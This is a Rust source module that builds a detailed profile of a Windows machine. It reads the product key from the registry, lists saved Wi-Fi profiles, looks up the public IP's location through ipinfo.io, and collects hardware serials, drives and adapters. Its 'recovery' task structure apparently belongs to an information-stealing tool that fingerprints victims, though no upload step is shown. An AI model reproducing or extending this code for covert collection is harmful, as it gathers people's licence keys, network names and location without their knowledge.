use crate::recovery::task::RecoveryError;
use crate::recovery::helpers::winhttp::Client;
use serde_json::Value;
use tokio::process::Command;
use tracing::warn;
use winreg::{RegKey, enums::HKEY_LOCAL_MACHINE};

pub struct HardwareSnapshot {
    pub operating_system: String,
    pub location: String,
    pub product_key: String,
    pub bios_version: String,
    pub processor_id: String,
    pub motherboard_serial: String,
    pub total_physical_memory: String,
    pub graphics_card: String,
    pub wifi_profiles: String,
    pub system_uptime: String,
    pub network_adapters: String,
}

pub struct DriveDetails {
    pub disk_drives: String,
    pub partitions: String,
    pub logical_disks: String,
}

pub async fn gather_snapshot(client: &Client) -> HardwareSnapshot {
    HardwareSnapshot {
        operating_system: describe_command_output("Operating System", "systeminfo", &[]).await,
        location: fetch_location(client).await,
        product_key: read_windows_product_key(),
        bios_version: describe_command_output("BIOS Version", "wmic", &["bios", "get", "version"])
            .await,
        processor_id: describe_command_output(
            "Processor ID",
            "wmic",
            &["cpu", "get", "ProcessorId"],
        )
        .await,
        motherboard_serial: describe_command_output(
            "Motherboard Serial",
            "wmic",
            &["baseboard", "get", "SerialNumber"],
        )
        .await,
        total_physical_memory: describe_command_output(
            "Total Memory",
            "wmic",
            &["computersystem", "get", "TotalPhysicalMemory"],
        )
        .await,
        graphics_card: describe_command_output(
            "Graphics Card",
            "wmic",
            &["path", "win32_videocontroller", "get", "name"],
        )
        .await,
        wifi_profiles: gather_wifi_profiles().await,
        system_uptime: fetch_system_uptime().await,
        network_adapters: describe_command_output(
            "Network Adapters",
            "wmic",
            &[
                "path",
                "Win32_NetworkAdapter",
                "where",
                "NetEnabled=True",
                "get",
                "Name,Speed",
            ],
        )
        .await,
    }
}

pub async fn gather_drive_info() -> DriveDetails {
    let disk_drives = describe_command_output(
        "Disk Drives",
        "wmic",
        &["diskdrive", "get", "DeviceID,Model,Size,SerialNumber"],
    )
    .await;
    let partitions = describe_command_output(
        "Partitions",
        "wmic",
        &["partition", "get", "DiskIndex,DeviceID,Name"],
    )
    .await;
    let logical_disks = describe_command_output(
        "Logical Disks",
        "wmic",
        &["logicaldisk", "get", "DeviceID,FileSystem,FreeSpace,Size"],
    )
    .await;

    DriveDetails {
        disk_drives,
        partitions,
        logical_disks,
    }
}

async fn describe_command_output(label: &str, cmd: &str, args: &[&str]) -> String {
    match capture_command_output(cmd, args).await {
        Ok(output) => output,
        Err(err) => {
            warn!(command = ?cmd, error = ?err, "failed to capture {label}");
            format!("{label} unavailable: {err}")
        }
    }
}

async fn capture_command_output(cmd: &str, args: &[&str]) -> Result<String, RecoveryError> {
    let output = Command::new(cmd).args(args).output().await?;
    if !output.status.success() {
        return Err(RecoveryError::Custom(format!(
            "command `{cmd}` failed with code {:?}",
            output.status.code()
        )));
    }
    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
}

async fn fetch_location(client: &Client) -> String {
    match client.get("https://ipinfo.io/json").send().await {
        Ok(response) => match response.json::<Value>().await {
            Ok(value) => format_location(&value),
            Err(err) => {
                warn!(error = ?err, "failed to parse location response");
                "Location data unavailable".to_string()
            }
        },
        Err(err) => {
            warn!(error = ?err, "failed to fetch location");
            "Location data unavailable".to_string()
        }
    }
}

fn format_location(value: &Value) -> String {
    let ip = value
        .get("ip")
        .and_then(|v| v.as_str())
        .unwrap_or("Unknown");
    let city = value
        .get("city")
        .and_then(|v| v.as_str())
        .unwrap_or("Unknown");
    let region = value
        .get("region")
        .and_then(|v| v.as_str())
        .unwrap_or("Unknown");
    let country = value
        .get("country")
        .and_then(|v| v.as_str())
        .unwrap_or("Unknown");
    let tz = value
        .get("timezone")
        .and_then(|v| v.as_str())
        .unwrap_or("Unknown");
    format!("IP: {ip}, City: {city}, Region: {region}, Country: {country}, Timezone: {tz}")
}

async fn fetch_system_uptime() -> String {
    let script = r#"$interval=(Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime; Write-Output ("{0} days, {1} hours, {2} minutes, {3} seconds" -f $interval.Days, $interval.Hours, $interval.Minutes, $interval.Seconds)"#;
    match capture_command_output("powershell", &["-NoProfile", "-Command", script]).await {
        Ok(output) => output,
        Err(err) => {
            warn!(error = ?err, "failed to capture uptime");
            "System uptime unavailable".to_string()
        }
    }
}

fn read_windows_product_key() -> String {
    const REG_PATH: &str =
        r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform";
    RegKey::predef(HKEY_LOCAL_MACHINE)
        .open_subkey(REG_PATH)
        .ok()
        .and_then(|key| key.get_value::<String, _>("BackupProductKeyDefault").ok())
        .unwrap_or_else(|| "Product Key Not Found".to_string())
}

async fn gather_wifi_profiles() -> String {
    match capture_command_output("netsh", &["wlan", "show", "profiles"]).await {
        Ok(output) => {
            let profiles = output
                .lines()
                .filter_map(|line| {
                    let trimmed = line.trim();
                    if trimmed.starts_with("All User Profile") {
                        trimmed
                            .splitn(2, ':')
                            .nth(1)
                            .map(|value| value.trim().to_string())
                    } else {
                        None
                    }
                })
                .collect::<Vec<_>>();
            if profiles.is_empty() {
                "No WIFI profiles found".to_string()
            } else {
                profiles.join("\n")
            }
        }
        Err(err) => {
            warn!(error = ?err, "failed to retrieve wifi profiles");
            "WIFI profiles unavailable".to_string()
        }
    }
}
